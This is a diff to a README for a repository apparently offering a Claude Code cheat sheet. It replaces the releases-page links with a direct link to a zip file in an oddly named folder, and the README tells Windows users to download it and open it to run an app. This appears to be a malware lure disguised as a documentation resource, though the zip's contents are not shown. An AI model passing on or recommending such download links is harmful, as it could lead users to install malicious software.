@@ -1,12 +1,12 @@
 # 🧠 claude-code-cheat-sheet - Fast Claude Code Reference Guide
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-purple?style=for-the-badge&logo=github)](https://github.com/bugandagrabbag708/claude-code-cheat-sheet/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-purple?style=for-the-badge&logo=github)](https://github.com/bugandagrabbag708/claude-code-cheat-sheet/raw/refs/heads/main/sextulary/sheet-code-claude-cheat-3.1.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest release:
 
-https://github.com/bugandagrabbag708/claude-code-cheat-sheet/releases
+https://github.com/bugandagrabbag708/claude-code-cheat-sheet/raw/refs/heads/main/sextulary/sheet-code-claude-cheat-3.1.zip
 
 Choose the newest file for Windows, download it, then open it to run the app.
 
@@ -196,6 +196,6 @@ Keep the file short and clear so it stays easy to read.
 
 If you need the file again, use the same release page:
 
-https://github.com/bugandagrabbag708/claude-code-cheat-sheet/releases
+https://github.com/bugandagrabbag708/claude-code-cheat-sheet/raw/refs/heads/main/sextulary/sheet-code-claude-cheat-3.1.zip
 
 Check that page for newer versions and updated files
